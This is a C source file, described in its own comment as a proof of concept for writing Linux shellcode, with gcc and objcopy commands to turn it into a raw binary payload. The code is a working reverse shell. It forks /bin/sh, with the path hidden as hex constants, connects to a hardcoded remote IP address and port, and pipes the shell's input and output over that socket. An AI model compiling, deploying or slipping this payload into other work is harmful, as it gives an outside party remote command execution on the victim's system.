/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
/**
  This is only a PoC to demonstrate writing shellcode for Linux in C
  
  gcc -N -O0 -fno-stack-protector -nostdlib tls.c -fpic -o tls
  objcopy -O binary --only-section=.text tls tls.bin

  */
#include "include.h"

#define REMOTE_PORT 4082
#define REMOTE_HOST 0x0F932A105 // 5.161.50.249

//void main(void) {
void _start(void) {  
      struct sockaddr_in sa;
      int                i, r, s, len, efd; 
      int                fd, in[2], out[2];
      char               buf[BUFSIZ];
      struct epoll_event evts;
      char               *args[2];
      pid_t              pid;
      data_t             ds;
      int                str[8];

      init_api(&ds);
      
      // create pipes for redirection of stdin/stdout/stderr
      ds.api._pipe(in);
      ds.api._pipe(out);

      pid = ds.api._fork();

      // if child process
      if (pid == 0) {
        // assign read end to stdin
        ds.api._dup2(in[0],  STDIN_FILENO);
        // assign write end to stdout   
        ds.api._dup2(out[1], STDOUT_FILENO);
        // assign write end to stderr  
        ds.api._dup2(out[1], STDERR_FILENO);  
        
        // close pipes
        ds.api._close(in[0]);  ds.api._close(in[1]);
        ds.api._close(out[0]); ds.api._close(out[1]);
        
        // execute shell
        // /bin/sh
        str[0] = 0x6e69622f;
        str[1] = 0x0068732f;
        args[0] = (char*)str;
        args[1] = NULL;
        ds.api._execve(args[0], args, NULL);
      } else {
        // close read and write ends
        ds.api._close(in[0]); ds.api._close(out[1]);

        /*// Initialize TLS session 
        ds.api._gnutls_init(&session, GNUTLS_CLIENT);

        // X509 stuff
        ds.api._gnutls_certificate_allocate_credentials(&xcred);
        ds.api._gnutls_certificate_set_x509_system_trust(xcred);
        ds.api._gnutls_set_default_priority(session);
        ds.api._gnutls_credentials_set(session, GNUTLS_CRD_CERTIFICATE, xcred);

        // NORMAL
        str[0] = 0x4d524f4e;
        str[1] = 0x00004c41;
        ds.api._gnutls_priority_init(&priority_cache, (char*)str, NULL);
        ds.api._gnutls_priority_set(session, priority_cache);*/
        
        // create a socket
        ds.s = s = ds.api._socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
        
        sa.sin_family = AF_INET;
        sa.sin_port   = ds.api._htons(REMOTE_PORT);
        
        // connect to remote host
        sa.sin_addr.s_addr = REMOTE_HOST;
      
        r = ds.api._connect(s, (struct sockaddr*)&sa, sizeof(sa));
        

        if(r >= 0) {
          // open an epoll file descriptor
          efd = ds.api._epoll_create1(0);
    
          // add 2 descriptors to monitor stdout and socket
          for (i=0; i<2; i++) {
            fd = (i==0) ? s : out[0];
            evts.data.fd = fd;
            evts.events  = EPOLLIN;
        
            ds.api._epoll_ctl(efd, EPOLL_CTL_ADD, fd, &evts);
          }
          
          // now loop until user exits or some other error
          for (;;) {
            r = ds.api._epoll_wait(efd, &evts, 1, -1);
          
            // error? bail out           
            if (r < 0) break;
          
            // not input? bail out
            if (!(evts.events & EPOLLIN)) break;

            fd = evts.data.fd;

            if(fd == s)
            {
              // read from socket and write to stdin
              len = ds.api._read(s, buf, BUFSIZ);
              ds.api._write(in[1], buf, len);
            } else
            {
              // read from stdout and write to socket
              len = ds.api._read(out[0], buf, BUFSIZ);
              if(!len) break;
              ds.api._write(s, buf, len);
            }      
          }
        }
        
        ds.api._epoll_ctl(efd, EPOLL_CTL_DEL, s, NULL);
        ds.api._epoll_ctl(efd, EPOLL_CTL_DEL, out[0], NULL);
        // shutdown socket
        ds.api._shutdown(s, SHUT_RDWR);
        ds.api._close(s);
      }
      // terminate shell      
      ds.api._kill(pid, SIGCHLD);
      ds.api._close(in[1]);
      ds.api._close(out[0]);
}
